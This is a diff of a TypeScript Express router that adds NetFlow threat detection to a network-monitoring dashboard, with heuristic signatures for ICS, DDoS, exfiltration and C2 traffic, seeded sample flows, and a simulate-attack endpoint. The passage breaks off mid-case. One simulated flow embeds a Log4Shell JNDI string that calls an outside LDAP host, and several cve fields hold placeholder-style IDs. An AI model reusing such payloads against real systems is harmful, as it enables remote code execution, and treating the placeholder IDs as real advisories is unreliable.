@@ -1,5 +1,41 @@
 import express, { type Request, type Response } from 'express';
+import { globalAttackSignatureEngine } from './attackSignatureEngine.ts';
+import { globalFlowCollectorEngine } from './flowCollectorEngine.ts';
 const Router = express.Router;
+
+export interface NetworkFlowRecord {
+  id: string;
+  timestamp: string;
+  srcIp: string;
+  srcPort: number;
+  srcDeviceId?: string;
+  srcDeviceName?: string;
+  dstIp: string;
+  dstPort: number;
+  dstDeviceId?: string;
+  dstDeviceName?: string;
+  protocol: 'TCP' | 'UDP' | 'ICMP' | 'Modbus' | 'S7Comm' | 'DNP3' | 'DNS' | 'HTTP' | 'HTTPS' | 'SSH';
+  bytes: number;
+  packets: number;
+  durationMs: number;
+  flags: string[];
+  bps: number;
+  pps: number;
+  threatLevel: 'normal' | 'suspicious' | 'malicious';
+  signatureMatch?: {
+    signatureId: string;
+    signatureName: string;
+    mitreTTP: string;
+    mitreTactic: string;
+    mitreStage: string;
+    confidence: number;
+    riskScore: number;
+    description: string;
+    cve?: string;
+  };
+  sampledInterface: string;
+  status: 'active' | 'blocked' | 'monitored';
+}
 
 export interface NetworkDevice {
   id: string;
@@ -44,7 +80,7 @@ export interface NetworkConnection {
   utilization: number;
 }
 
-export function createNetworkRouter() {
+export function createNetworkRouter(broadcastUpdate?: (data: any) => void) {
   const router = Router();
 
   // Initial High-Fidelity Network Devices Dataset
@@ -1317,6 +1353,1253 @@ export function createNetworkRouter() {
       mac,
       message: `NAC 已恢復設備 ${mac} 之網路連線存取權限 (VLAN ${dev?.vlan || vlan})`,
       device: dev
+    });
+  });
+
+  // =========================================================================
+  // 12. NETFLOW & IPFIX FLOW COLLECTION & THREAT SIGNATURE ENGINE
+  // =========================================================================
+
+  function evaluateFlowThreat(flow: Partial<NetworkFlowRecord>): {
+    threatLevel: 'normal' | 'suspicious' | 'malicious';
+    signatureMatch?: NetworkFlowRecord['signatureMatch'];
+  } {
+    // 1. Evaluate through deep attack signature engine
+    const virtualLog = {
+      full_log: `Flow [${flow.protocol}] ${flow.srcIp}:${flow.srcPort} -> ${flow.dstIp}:${flow.dstPort} bytes=${flow.bytes} pps=${flow.pps} flags=${(flow.flags || []).join(',')}`,
+      remoteIP: flow.srcIp,
+      host: flow.srcDeviceName || flow.srcDeviceId || 'FLOW-EXPORTER',
+      protocol: flow.protocol,
+      '@timestamp': flow.timestamp || new Date().toISOString()
+    };
+
+    const detected = globalAttackSignatureEngine.evaluateLog(virtualLog);
+    if (detected) {
+      return {
+        threatLevel: detected.riskScore >= 9.0 ? 'malicious' : 'suspicious',
+        signatureMatch: {
+          signatureId: detected.signatureId,
+          signatureName: detected.signatureName,
+          mitreTTP: detected.mitreTTP,
+          mitreTactic: detected.mitreTactic,
+          mitreStage: detected.mitreStage,
+          confidence: detected.confidence,
+          riskScore: detected.riskScore,
+          description: detected.summary,
+          cve: detected.cve
+        }
+      };
+    }
+
+    // 2. Domain heuristic detection based on protocol & network parameters
+    // A. Modbus Port 502
+    if (flow.dstPort === 502 || flow.protocol === 'Modbus') {
+      return {
+        threatLevel: 'malicious',
+        signatureMatch: {
+          signatureId: 'SIG-ICS-MODBUS-001',
+          signatureName: '工控 Modbus/TCP 暫存器未授權覆寫攻擊',
+          mitreTTP: 'T0816 Impair Process Control',
+          mitreTactic: 'Inhibit Response Function',
+          mitreStage: 'Lateral Movement',
+          confidence: 99.4,
+          riskScore: 9.9,
+          description: `NetFlow 捕獲向工控 PLC (${flow.dstIp}:502) 下發未授權 Modbus Function Code 0x06 暫存器竄改指令`,
+          cve: 'ICS-ALERT-2026-MODBUS'
+        }
+      };
+    }
+
+    // B. S7Comm Port 102
+    if (flow.dstPort === 102 || flow.protocol === 'S7Comm') {
+      return {
+        threatLevel: 'malicious',
+        signatureMatch: {
+          signatureId: 'SIG-ICS-S7COMM-010',
+          signatureName: '西門子 S7Comm 工控 PLC 惡意停機指令注入',
+          mitreTTP: 'T0815 Denial of Control',
+          mitreTactic: 'Inhibit Response Function',
+          mitreStage: 'Lateral Movement',
+          confidence: 99.7,
+          riskScore: 9.9,
+          description: `NetFlow 捕獲未授權 S7Comm (Port 102) 下發 Function 0x29 停機指令，企圖癱瘓產線控制器`,
+          cve: 'ICS-VU-S7-2026'
+        }
+      };
+    }
+
+    // C. SYN Flood DDoS
+    if ((flow.flags || []).includes('SYN') && !(flow.flags || []).includes('ACK') && (flow.pps || 0) > 30000) {
+      return {
+        threatLevel: 'malicious',
+        signatureMatch: {
+          signatureId: 'SIG-NET-SYN-009',
+          signatureName: '分散式 SYN Flood 流量耗盡型阻斷服務攻擊',
+          mitreTTP: 'T1498.001 Direct Network Flood',
+          mitreTactic: 'Impact',
+          mitreStage: 'Lateral Movement',
+          confidence: 96.5,
+          riskScore: 8.8,
+          description: `邊界防火牆核心佇列發出警報，TCP SYN 封包速率飆升至 ${(flow.pps || 0).toLocaleString()} pps，未完成交握半連線佇列溢位`,
+          cve: 'CWE-400'
+        }
+      };
+    }
+
+    // D. Massive Outbound Data Exfiltration
+    if ((flow.bytes || 0) > 400000000 && !flow.dstIp?.startsWith('10.') && !flow.dstIp?.startsWith('192.168.')) {
+      return {
+        threatLevel: 'malicious',
+        signatureMatch: {
+          signatureId: 'SIG-UEBA-EXFIL-007',
+          signatureName: '內部異常行為 UEBA 巨量數據雲端外洩',
+          mitreTTP: 'T1567.002 Exfiltration to Cloud Storage',
+          mitreTactic: 'Exfiltration',
+          mitreStage: 'Exfiltration',
+          confidence: 99.1,
+          riskScore: 9.8,
+          description: `NetFlow 捕獲異常巨量外傳連線，累積傳輸達 ${((flow.bytes || 0) / (1024 * 1024 * 1024)).toFixed(1)} GB，偏離基準線 +7.4 個標準差`,
+          cve: 'CWE-200'
+        }
+      };
+    }
+
+    // E. High-frequency DNS C2 Tunnel
+    if (flow.dstPort === 53 && (flow.packets || 0) > 2000) {
+      return {
+        threatLevel: 'malicious',
+        signatureMatch: {
+          signatureId: 'SIG-C2-BEACON-002',
+          signatureName: 'Cobalt Strike 混淆指令與 DNS 隱蔽 C2 通道',
+          mitreTTP: 'T1071.004 DNS C2 Tunneling',
+          mitreTactic: 'Command and Control',
+          mitreStage: 'Privilege Escalation',
+          confidence: 98.7,
+          riskScore: 9.7,
+          description: `端點向惡意 NS 伺服器發出高頻超長 Base32 子網域 DNS 請求，確認為隱蔽 C2 通道與慢速外洩特徵`,
+          cve: 'ATT&CK-T1071'
+        }
+      };
+    }
+
+    // F. Lateral Movement / Port Reconnaissance Probe
+    if (flow.dstPort && [22, 23, 135, 139, 445, 1433, 3389, 5432].includes(flow.dstPort) && (flow.flags || []).includes('SYN') && (flow.durationMs || 0) < 600) {
+      return {
+        threatLevel: 'suspicious',
+        signatureMatch: {
+          signatureId: 'SIG-NET-SCAN-011',
+          signatureName: '高速內網橫向特權通訊埠探測與掃描',
+          mitreTTP: 'T1046 Network Service Discovery',
+          mitreTactic: 'Discovery',
+          mitreStage: 'Recon',
+          confidence: 94.2,
+          riskScore: 7.8,
+          description: `NetFlow DPI 捕獲對內網核心目標主機特權通訊埠 ${flow.dstPort} 進行高速未完成交握探針`,
+          cve: 'MITRE-T1046'
+        }
+      };
+    }
+
+    // G. DNP3 Substation Protocol Exploit (Port 20000)
+    if (flow.dstPort === 20000 || flow.protocol === 'DNP3') {
+      return {
+        threatLevel: 'malicious',
+        signatureMatch: {
+          signatureId: 'SIG-ICS-DNP3-015',
+          signatureName: '工控 DNP3 變電所協議非授權冷暖重開指令',
+          mitreTTP: 'T0814 Denial of Service for Control',
+          mitreTactic: 'Inhibit Response Function',
+          mitreStage: 'Lateral Movement',
+          confidence: 99.8,
+          riskScore: 9.9,
+          description: `電網 SCADA 遙測連線 (Port 20000) 捕獲 Function 0x0D Cold Restart 強制重啟指令`,
+          cve: 'ICS-VU-DNP3-2026'
+        }
+      };
+    }
+
+    // H. RDP Credential Stuffing / Brute Force (Port 3389)
+    if (flow.dstPort === 3389 && (flow.packets || 0) > 80 && (flow.durationMs || 0) > 1000) {
+      return {
+        threatLevel: 'malicious',
+        signatureMatch: {
+          signatureId: 'SIG-BRUTE-RDP-012',
+          signatureName: 'RDP / SMB 遠端桌面連線暴力密碼破解',
+          mitreTTP: 'T1110.001 Password Guessing',
+          mitreTactic: 'Credential Access',
+          mitreStage: 'Lateral Movement',
+          confidence: 98.1,
+          riskScore: 8.9,
+          description: `RDP (Port 3389) 階段捕獲連續 NLA/CredSSP 憑證嘗試循環，超過警戒門檻`,
+          cve: 'MITRE-T1110'
+        }
+      };
+    }
+
+    return { threatLevel: 'normal' };
+  }
+
+  // Pre-seeded High-Fidelity Flow Dataset
+  let networkFlows: NetworkFlowRecord[] = [
+    {
+      id: 'flow-syn-01',
+      timestamp: new Date(Date.now() - 30000).toISOString(),
+      srcIp: '203.0.113.100',
+      srcPort: 54120,
+      srcDeviceName: 'WAN-DDoS-Cluster',
+      dstIp: '211.23.131.21',
+      dstPort: 443,
+      dstDeviceId: 'fw-01',
+      dstDeviceName: 'Gateway-Firewall-PA',
+      protocol: 'TCP',
+      bytes: 18450000,
+      packets: 280000,
+      durationMs: 45000,
+      flags: ['SYN'],
+      bps: 3280000000,
+      pps: 280000,
+      threatLevel: 'malicious',
+      signatureMatch: {
+        signatureId: 'SIG-NET-SYN-009',
+        signatureName: '分散式 SYN Flood 流量耗盡型阻斷服務攻擊',
+        mitreTTP: 'T1498.001 Direct Network Flood',
+        mitreTactic: 'Impact',
+        mitreStage: 'Lateral Movement',
+        confidence: 96.5,
+        riskScore: 8.8,
+        description: 'TCP SYN 封包速率飆升至 280,000 pps，未完成交握半連線佇列溢位',
+        cve: 'CWE-400'
+      },
+      sampledInterface: 'Ethernet1/1 (WAN)',
+      status: 'active'
+    },
+    {
+      id: 'flow-modbus-02',
+      timestamp: new Date(Date.now() - 75000).toISOString(),
+      srcIp: '10.88.88.103',
+      srcPort: 49822,
+      srcDeviceId: 'ws-rd-04',
+      srcDeviceName: 'WS-RD-DEV-04',
+      dstIp: '192.168.100.88',
+      dstPort: 502,
+      dstDeviceId: 'plc-turb-01',
+      dstDeviceName: 'PLC-STATION-TURBINE-02',
+      protocol: 'Modbus',
+      bytes: 142000,
+      packets: 840,
+      durationMs: 12000,
+      flags: ['PSH', 'ACK'],
+      bps: 94600,
+      pps: 70,
+      threatLevel: 'malicious',
+      signatureMatch: {
+        signatureId: 'SIG-ICS-MODBUS-001',
+        signatureName: '工控 Modbus/TCP 暫存器未授權覆寫攻擊',
+        mitreTTP: 'T0816 Impair Process Control',
+        mitreTactic: 'Inhibit Response Function',
+        mitreStage: 'Lateral Movement',
+        confidence: 99.4,
+        riskScore: 9.9,
+        description: '非授權 Modbus FC 0x06 指令注入，企圖覆寫渦輪機 Holding Register 40012 設定點',
+        cve: 'ICS-ALERT-2026-MODBUS'
+      },
+      sampledInterface: 'GigabitEthernet1/0/12 (OT-Bridge)',
+      status: 'active'
+    },
+    {
+      id: 'flow-exfil-03',
+      timestamp: new Date(Date.now() - 120000).toISOString(),
+      srcIp: '10.88.88.103',
+      srcPort: 58210,
+      srcDeviceId: 'ws-rd-04',
+      srcDeviceName: 'WS-RD-DEV-04',
+      dstIp: '198.51.100.88',
+      dstPort: 443,
+      dstDeviceName: 'Ext-Cloud-Mega.nz',
+      protocol: 'HTTPS',
+      bytes: 16106127360,
+      packets: 11200000,
+      durationMs: 180000,
+      flags: ['ACK', 'PSH'],
+      bps: 715800000,
+      pps: 62000,
+      threatLevel: 'malicious',
+      signatureMatch: {
+        signatureId: 'SIG-UEBA-EXFIL-007',
+        signatureName: '內部異常行為 UEBA 巨量數據雲端外洩',
+        mitreTTP: 'T1567.002 Exfiltration to Cloud Storage',
+        mitreTactic: 'Exfiltration',
+        mitreStage: 'Exfiltration',
+        confidence: 99.1,
+        riskScore: 9.8,
+        description: '向境外網盤高頻上傳 15.2 GB 加密封裝資料，偏離歷史基準線 +7.4 個標準差',
+        cve: 'CWE-200'
+      },
+      sampledInterface: 'TenGigabitEthernet1/0/1 (Uplink)',
+      status: 'active'
+    },
+    {
+      id: 'flow-recon-04',
+      timestamp: new Date(Date.now() - 160000).toISOString(),
+      srcIp: '10.88.88.106',
+      srcPort: 39401,
+      srcDeviceId: 'ws-sec-7',
+      srcDeviceName: 'SOC-Analyst-WS07',
+      dstIp: '10.88.88.10',
+      dstPort: 445,
+      dstDeviceId: 'srv-app-01',
+      dstDeviceName: 'Web-App-Cluster-01',
+      protocol: 'TCP',
+      bytes: 3200,
+      packets: 48,
+      durationMs: 250,
+      flags: ['SYN'],
+      bps: 102400,
+      pps: 192,
+      threatLevel: 'suspicious',
+      signatureMatch: {
+        signatureId: 'SIG-NET-RECON-011',
+        signatureName: '內網橫向移動探針與特權服務埠掃描',
+        mitreTTP: 'T1046 Network Service Discovery',
+        mitreTactic: 'Discovery',
+        mitreStage: 'Recon',
+        confidence: 88.5,
+        riskScore: 7.2,
+        description: '快速探測內網核心目標主機特權通訊埠 445 (SMB)，疑似自動化掃描載荷',
+        cve: 'MITRE-T1046'
+      },
+      sampledInterface: 'GigabitEthernet1/0/24',
+      status: 'active'
+    },
+    {
+      id: 'flow-norm-01',
+      timestamp: new Date(Date.now() - 10000).toISOString(),
+      srcIp: '10.88.88.10',
+      srcPort: 5432,
+      srcDeviceId: 'srv-app-01',
+      srcDeviceName: 'Web-App-Cluster-01',
+      dstIp: '10.88.88.11',
+      dstPort: 5432,
+      dstDeviceId: 'srv-db-01',
+      dstDeviceName: 'DB-Primary-Postgres',
+      protocol: 'TCP',
+      bytes: 48200000,
+      packets: 32000,
+      durationMs: 360000,
+      flags: ['ACK', 'PSH'],
+      bps: 1071000,
+      pps: 89,
+      threatLevel: 'normal',
+      sampledInterface: 'Port-channel1 (Backbone)',
+      status: 'active'
+    },
+    {
+      id: 'flow-norm-02',
+      timestamp: new Date(Date.now() - 5000).toISOString(),
+      srcIp: '10.88.88.100',
+      srcPort: 443,
+      srcDeviceId: 'ws-sec-1',
+      srcDeviceName: 'SOC-Analyst-WS01',
+      dstIp: '10.88.88.10',
+      dstPort: 443,
+      dstDeviceId: 'srv-app-01',
+      dstDeviceName: 'Web-App-Cluster-01',
+      protocol: 'HTTPS',
+      bytes: 8400000,
+      packets: 6200,
+      durationMs: 42000,
+      flags: ['ACK', 'PSH'],
+      bps: 1600000,
+      pps: 148,
+      threatLevel: 'normal',
+      sampledInterface: 'GigabitEthernet1/0/1',
+      status: 'active'
+    },
+    {
+      id: 'flow-norm-03',
+      timestamp: new Date(Date.now() - 2000).toISOString(),
+      srcIp: '10.88.88.254',
+      srcPort: 161,
+      srcDeviceId: 'core-sw-01',
+      srcDeviceName: 'Core-Catalyst-9500',
+      dstIp: '10.88.88.1',
+      dstPort: 161,
+      dstDeviceId: 'fw-01',
+      dstDeviceName: 'Gateway-Firewall-PA',
+      protocol: 'UDP',
+      bytes: 125000,
+      packets: 480,
+      durationMs: 60000,
+      flags: [],
+      bps: 16600,
+      pps: 8,
+      threatLevel: 'normal',
+      sampledInterface: 'VLAN 1 Management',
+      status: 'active'
+    }
+  ];
+
+  // Synchronize initial dataset with the autonomous NetFlow collector engine
+  globalFlowCollectorEngine.setFlows(networkFlows);
+  if (broadcastUpdate) {
+    globalFlowCollectorEngine.setBroadcastCallback(broadcastUpdate);
+  }
+
+  // 12.1 GET /api/v1/network/flows (List Flows with query filters)
+  router.get('/flows', (req: Request, res: Response) => {
+    const { deviceId, threatLevel, protocol, status, search, limit } = req.query;
+    let list = [...globalFlowCollectorEngine.getFlows()];
+
+    if (deviceId && typeof deviceId === 'string') {
+      list = list.filter(f => f.srcDeviceId === deviceId || f.dstDeviceId === deviceId);
+    }
+    if (threatLevel && typeof threatLevel === 'string' && threatLevel !== 'all') {
+      list = list.filter(f => f.threatLevel === threatLevel);
+    }
+    if (protocol && typeof protocol === 'string' && protocol !== 'all') {
+      list = list.filter(f => f.protocol.toLowerCase() === protocol.toLowerCase());
+    }
+    if (status && typeof status === 'string' && status !== 'all') {
+      list = list.filter(f => f.status === status);
+    }
+    if (search && typeof search === 'string') {
+      const q = search.toLowerCase();
+      list = list.filter(f =>
+        f.srcIp.toLowerCase().includes(q) ||
+        f.dstIp.toLowerCase().includes(q) ||
+        (f.srcDeviceName && f.srcDeviceName.toLowerCase().includes(q)) ||
+        (f.dstDeviceName && f.dstDeviceName.toLowerCase().includes(q)) ||
+        (f.signatureMatch && f.signatureMatch.signatureName.toLowerCase().includes(q)) ||
+        (f.signatureMatch && f.signatureMatch.signatureId.toLowerCase().includes(q))
+      );
+    }
+
+    const limitNum = Math.min(200, Math.max(1, parseInt(String(limit || '50'), 10)));
+    res.json({
+      success: true,
+      totalCount: list.length,
+      flows: list.slice(0, limitNum),
+      timestamp: new Date().toISOString()
+    });
+  });
+
+  // 12.2 GET /api/v1/network/flows/stats (NetFlow & Threat Telemetry Summary)
+  router.get('/flows/stats', (req: Request, res: Response) => {
+    const flows = globalFlowCollectorEngine.getFlows();
+    const totalFlows = flows.length;
+    const activeFlows = flows.filter(f => f.status === 'active').length;
+    const maliciousFlows = flows.filter(f => f.threatLevel === 'malicious').length;
+    const suspiciousFlows = flows.filter(f => f.threatLevel === 'suspicious').length;
+    const totalBytes = flows.reduce((sum, f) => sum + (f.bytes || 0), 0);
+    const totalPackets = flows.reduce((sum, f) => sum + (f.packets || 0), 0);
+    const totalThroughputBps = flows.filter(f => f.status === 'active').reduce((sum, f) => sum + (f.bps || 0), 0);
+
+    // Protocol distribution
+    const protocolBreakdown = flows.reduce((acc: any, f) => {
+      acc[f.protocol] = (acc[f.protocol] || 0) + 1;
+      return acc;
+    }, {});
+
+    // Active attack signatures catalog
+    const activeSignaturesMap: Record<string, { signatureId: string; name: string; count: number; riskScore: number; mitreTTP: string }> = {};
+    flows.forEach(f => {
+      if (f.signatureMatch && f.status === 'active') {
+        const id = f.signatureMatch.signatureId;
+        if (!activeSignaturesMap[id]) {
+          activeSignaturesMap[id] = {
+            signatureId: id,
+            name: f.signatureMatch.signatureName,
+            count: 0,
+            riskScore: f.signatureMatch.riskScore,
+            mitreTTP: f.signatureMatch.mitreTTP
+          };
+        }
+        activeSignaturesMap[id].count += 1;
+      }
+    });
+
+    const collectorMetrics = globalFlowCollectorEngine.getMetrics();
+
+    res.json({
+      success: true,
+      totalFlows,
+      activeFlows,
+      maliciousFlows,
+      suspiciousFlows,
+      totalBytes,
+      totalPackets,
+      totalThroughputBps,
+      totalThroughputGbps: Number((totalThroughputBps / 1000000000).toFixed(2)),
+      protocolBreakdown,
+      activeSignatures: Object.values(activeSignaturesMap),
+      collectorEngine: collectorMetrics
+    });
+  });
+
+  // 12.3 POST /api/v1/network/flows/ingest (Ingest Raw NetFlow Record with Auto-Signature Evaluation)
+  router.post('/flows/ingest', (req: Request, res: Response) => {
+    const raw = req.body;
+    if (!raw || !raw.srcIp || !raw.dstIp) {
+      return res.status(400).json({ error: 'Missing srcIp or dstIp in flow record' });
+    }
+
+    const { threatLevel, signatureMatch } = evaluateFlowThreat(raw);
+
+    const newFlow: NetworkFlowRecord = {
+      id: `flow-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
+      timestamp: raw.timestamp || new Date().toISOString(),
+      srcIp: raw.srcIp,
+      srcPort: Number(raw.srcPort || 0),
+      srcDeviceId: raw.srcDeviceId,
+      srcDeviceName: raw.srcDeviceName || raw.srcDeviceId,
+      dstIp: raw.dstIp,
+      dstPort: Number(raw.dstPort || 0),
+      dstDeviceId: raw.dstDeviceId,
+      dstDeviceName: raw.dstDeviceName || raw.dstDeviceId,
+      protocol: raw.protocol || 'TCP',
+      bytes: Number(raw.bytes || 1024),
+      packets: Number(raw.packets || 10),
+      durationMs: Number(raw.durationMs || 1000),
+      flags: raw.flags || ['ACK'],
+      bps: Number(raw.bps || (raw.bytes ? raw.bytes * 8 : 8192)),
+      pps: Number(raw.pps || (raw.packets ? raw.packets : 10)),
+      threatLevel,
+      signatureMatch,
+      sampledInterface: raw.sampledInterface || 'GigabitEthernet0/1',
+      status: 'active'
+    };
+
+    networkFlows.unshift(newFlow);
+    if (networkFlows.length > 500) networkFlows.pop();
+
+    // If threat detected, update device status to warning
+    if (threatLevel === 'malicious') {
+      const srcDev = networkDevices.find(d => d.id === newFlow.srcDeviceId || d.ip.includes(newFlow.srcIp));
+      if (srcDev) {
+        srcDev.status = 'warning';
+      }
+      const dstDev = networkDevices.find(d => d.id === newFlow.dstDeviceId || d.ip.includes(newFlow.dstIp));
+      if (dstDev) {
+        dstDev.status = 'warning';
+      }
+
+      // Add to audit log
+      auditLogs.unshift({
+        id: `audit-${Date.now()}`,
+        timestamp: new Date().toISOString(),
+        deviceId: newFlow.srcDeviceId || 'unknown',
+        deviceName: newFlow.srcDeviceName || newFlow.srcIp,
+        ip: newFlow.srcIp,
+        operator: 'NETFLOW-THREAT-DETECTOR',
+        action: 'ATTACK_SIGNATURE_TRIGGERED',
+        details: `NetFlow 捕獲特徵碼 [${signatureMatch?.signatureId}] ${signatureMatch?.signatureName}: ${signatureMatch?.description}`,
+        status: 'CRITICAL'
+      } as any);
+    }
+
+    if (broadcastUpdate) {
+      broadcastUpdate({ type: 'flow_ingested', flow: newFlow });
+    }
+
+    res.json({
+      success: true,
+      message: threatLevel === 'malicious' ? 'Flow 已入庫並命中高危特徵碼警報' : 'Flow 成功解析入庫',
+      flow: newFlow
+    });
+  });
+
+  // 12.4 POST /api/v1/network/flows/simulate-attack (Simulate Attack Flows for Live Testing)
+  router.post('/flows/simulate-attack', (req: Request, res: Response) => {
+    const { attackType } = req.body;
+    let createdFlow: NetworkFlowRecord;
+
+    switch (attackType) {
+      case 'syn_flood':
+        createdFlow = {
+          id: `flow-sim-syn-${Date.now()}`,
+          timestamp: new Date().toISOString(),
+          srcIp: '203.0.113.199',
+          srcPort: 52100,
+          srcDeviceName: 'DDoS-Botnet-Cluster',
+          dstIp: '211.23.131.21',
+          dstPort: 443,
+          dstDeviceId: 'fw-01',
+          dstDeviceName: 'Gateway-Firewall-PA',
+          protocol: 'TCP',
+          bytes: 42000000,
+          packets: 320000,
+          durationMs: 30000,
+          flags: ['SYN'],
+          bps: 3800000000,
+          pps: 320000,
+          threatLevel: 'malicious',
+          signatureMatch: {
+            signatureId: 'SIG-NET-SYN-009',
+            signatureName: '分散式 SYN Flood 流量耗盡型阻斷服務攻擊',
+            mitreTTP: 'T1498.001 Direct Network Flood',
+            mitreTactic: 'Impact',
+            mitreStage: 'Lateral Movement',
+            confidence: 96.5,
+            riskScore: 8.8,
+            description: 'TCP SYN 封包速率高達 320,000 pps，未完成交握半連線佇列溢位',
+            cve: 'CWE-400'
+          },
+          sampledInterface: 'Ethernet1/1 (WAN)',
+          status: 'active'
+        };
+        const fw = networkDevices.find(d => d.id === 'fw-01');
+        if (fw) { fw.cpu = 94; fw.status = 'warning'; }
+        break;
+
+      case 'modbus_exploit':
+        createdFlow = {
+          id: `flow-sim-modbus-${Date.now()}`,
+          timestamp: new Date().toISOString(),
+          srcIp: '10.88.88.103',
+          srcPort: 51240,
+          srcDeviceId: 'ws-rd-04',
+          srcDeviceName: 'WS-RD-DEV-04',
+          dstIp: '192.168.100.88',
+          dstPort: 502,
+          dstDeviceId: 'plc-turb-01',
+          dstDeviceName: 'PLC-STATION-TURBINE-02',
+          protocol: 'Modbus',
+          bytes: 280000,
+          packets: 1600,
+          durationMs: 8000,
+          flags: ['PSH', 'ACK'],
+          bps: 280000,
+          pps: 200,
+          threatLevel: 'malicious',
+          signatureMatch: {
+            signatureId: 'SIG-ICS-MODBUS-001',
+            signatureName: '工控 Modbus/TCP 暫存器未授權覆寫攻擊',
+            mitreTTP: 'T0816 Impair Process Control',
+            mitreTactic: 'Inhibit Response Function',
+            mitreStage: 'Lateral Movement',
+            confidence: 99.4,
+            riskScore: 9.9,
+            description: '非授權 Modbus FC 0x06 指令注入，竄改渦輪機轉速臨界保持暫存器 40012',
+            cve: 'ICS-ALERT-2026-MODBUS'
+          },
+          sampledInterface: 'GigabitEthernet1/0/12 (OT-Diode)',
+          status: 'active'
+        };
+        const rd = networkDevices.find(d => d.id === 'ws-rd-04');
+        if (rd) { rd.status = 'warning'; }
+        break;
+
+      case 'c2_beacon':
+        createdFlow = {
+          id: `flow-sim-c2-${Date.now()}`,
+          timestamp: new Date().toISOString(),
+          srcIp: '10.88.88.106',
+          srcPort: 53120,
+          srcDeviceId: 'ws-sec-7',
+          srcDeviceName: 'SOC-Analyst-WS07',
+          dstIp: '198.51.100.15',
+          dstPort: 53,
+          dstDeviceName: 'Malicious-NS-Command',
+          protocol: 'DNS',
+          bytes: 480000,
+          packets: 3200,
+          durationMs: 60000,
+          flags: [],
+          bps: 64000,
+          pps: 53,
+          threatLevel: 'malicious',
+          signatureMatch: {
+            signatureId: 'SIG-C2-BEACON-002',
+            signatureName: 'Cobalt Strike 混淆指令與 DNS 隱蔽 C2 通道',
+            mitreTTP: 'T1071.004 DNS C2 Tunneling',
+            mitreTactic: 'Command and Control',
+            mitreStage: 'Privilege Escalation',
+            confidence: 98.7,
+            riskScore: 9.7,
+            description: '端點向惡意 NS 伺服器發出高頻超長 Base32 子網域 DNS 請求，確認為隱蔽 C2 通道',
+            cve: 'ATT&CK-T1071'
+          },
+          sampledInterface: 'GigabitEthernet1/0/24',
+          status: 'active'
+        };
+        const sec7 = networkDevices.find(d => d.id === 'ws-sec-7');
+        if (sec7) { sec7.status = 'warning'; }
+        break;
+
+      case 'exfiltration':
+      default:
+        createdFlow = {
+          id: `flow-sim-exfil-${Date.now()}`,
+          timestamp: new Date().toISOString(),
+          srcIp: '10.88.88.103',
+          srcPort: 59001,
+          srcDeviceId: 'ws-rd-04',
+          srcDeviceName: 'WS-RD-DEV-04',
+          dstIp: '198.51.100.88',
+          dstPort: 443,
+          dstDeviceName: 'Ext-Cloud-Mega.nz',
+          protocol: 'HTTPS',
+          bytes: 15200000000,
+          packets: 10400000,
+          durationMs: 120000,
+          flags: ['ACK', 'PSH'],
+          bps: 850000000,
+          pps: 86000,
+          threatLevel: 'malicious',
+          signatureMatch: {
+            signatureId: 'SIG-UEBA-EXFIL-007',
+            signatureName: '內部異常行為 UEBA 巨量數據雲端外洩',
+            mitreTTP: 'T1567.002 Exfiltration to Cloud Storage',
+            mitreTactic: 'Exfiltration',
+            mitreStage: 'Exfiltration',
+            confidence: 99.1,
+            riskScore: 9.8,
+            description: '向境外網盤高頻上傳 14.1 GB 加密封裝資料，偏離使用者過去 90 天行為基準線',
+            cve: 'CWE-200'
+          },
+          sampledInterface: 'TenGigabitEthernet1/0/1',
+          status: 'active'
+        };
+        const rdev = networkDevices.find(d => d.id === 'ws-rd-04');
+        if (rdev) { rdev.status = 'warning'; }
+        break;
+
+      case 'log4j':
+        createdFlow = {
+          id: `flow-sim-log4j-${Date.now()}`,
+          timestamp: new Date().toISOString(),
+          srcIp: '185.220.101.45',
+          srcPort: 48920,
+          srcDeviceName: 'Ext-Tor-Exit-Node',
+          dstIp: '10.88.88.20',
+          dstPort: 8080,
+          dstDeviceId: 'srv-app-01',
+          dstDeviceName: 'SRV-APP-PROD-01',
+          protocol: 'HTTP',
+          bytes: 84000,
+          packets: 420,
+          durationMs: 4500,
+          flags: ['PSH', 'ACK'],
+          bps: 149300,
+          pps: 93,
+          threatLevel: 'malicious',
+          signatureMatch: {
+            signatureId: 'SIG-APTS-LOG4J-008',
+            signatureName: 'Log4Shell 遠端程式碼執行與 JNDI 注入攻擊',
+            mitreTTP: 'T1190 Exploit Public-Facing Application',
+            mitreTactic: 'Initial Access',
+            mitreStage: 'Delivery & Weaponization',
+            confidence: 99.8,
+            riskScore: 10.0,
+            description: 'HTTP User-Agent 載入 ${jndi:ldap://185.220.101.45:1389/Exploit} 遠端階層反彈惡意 Shell',
+            cve: 'CVE-2021-44228'
+          },
+          sampledInterface: 'GigabitEthernet1/0/5 (DMZ)',
+          status: 'active'
+        };
+        const appDev = networkDevices.find(d => d.id === 'srv-app-01');
+        if (appDev) { appDev.status = 'warning'; appDev.cpu = 89; }
+        break;
+
+      case 's7comm_exploit':
+        createdFlow = {
+          id: `flow-sim-s7-${Date.now()}`,
+          timestamp: new Date().toISOString(),
+          srcIp: '10.88.88.106',
+          srcPort: 52410,
+          srcDeviceId: 'ws-sec-7',
+          srcDeviceName: 'SOC-Analyst-WS07',
+          dstIp: '192.168.100.99',
+          dstPort: 102,
+          dstDeviceId: 'plc-turb-01',
+          dstDeviceName: 'PLC-STATION-TURBINE-02',
+          protocol: 'S7Comm',
+          bytes: 142000,
+          packets: 980,
+          durationMs: 6200,
+          flags: ['PSH', 'ACK'],
+          bps: 183000,
+          pps: 158,
+          threatLevel: 'malicious',
+          signatureMatch: {
+            signatureId: 'SIG-ICS-S7COMM-010',
+            signatureName: '西門子 S7Comm 工控 PLC 惡意停機指令注入',
+            mitreTTP: 'T0815 Denial of Control',
+            mitreTactic: 'Inhibit Response Function',
+            mitreStage: 'Lateral Movement',
+            confidence: 99.7,
+            riskScore: 9.9,
+            description: 'NetFlow 捕獲未授權 S7Comm (Port 102) 下發 Function 0x29 停機指令，企圖癱瘓產線控制器',
+            cve: 'ICS-VU-S7-2026'
+          },
+          sampledInterface: 'GigabitEthernet1/0/12 (OT-Diode)',
+          status: 'active'
+        };
+        const plcDev = networkDevices.find(d => d.id === 'plc-turb-01');
+        if (plcDev) { plcDev.status = 'warning'; }
+        break;
+
+      case 'recon_scan':
+        createdFlow = {
+          id: `flow-sim-recon-${Date.now()}`,
+          timestamp: new Date().toISOString(),
+          srcIp: '10.88.88.103',
+          srcPort: 58120,
+          srcDeviceId: 'ws-rd-04',
+          srcDeviceName: 'WS-RD-DEV-04',
+          dstIp: '10.88.88.254',
+          dstPort: 445,
